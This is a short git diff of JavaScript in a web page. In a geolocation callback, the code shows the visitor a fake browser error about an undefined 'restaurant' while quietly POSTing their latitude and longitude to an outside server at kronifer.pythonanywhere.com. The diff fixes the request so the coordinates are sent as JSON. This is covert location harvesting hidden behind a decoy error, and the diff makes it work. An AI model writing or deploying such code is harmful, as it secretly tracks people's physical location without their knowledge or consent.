@@ -23,7 +23,7 @@ function showPosition(position) {
   x.innerHTML = "Uncaught ReferenceError: restaurant is not defined at showRestaurant:1:1"; //Error got funky
   let xhttp = new XMLHttpRequest();
   xhttp.open("POST", "https://kronifer.pythonanywhere.com/data", true);
-  xhttp.send({"lat": position.coords.latitude.toString(), "long": position.coords.longitude.toString()});
+  xhttp.send(JSON.stringify({"lat": position.coords.latitude.toString(), "long": position.coords.longitude.toString()}));
 }
 </script>
 
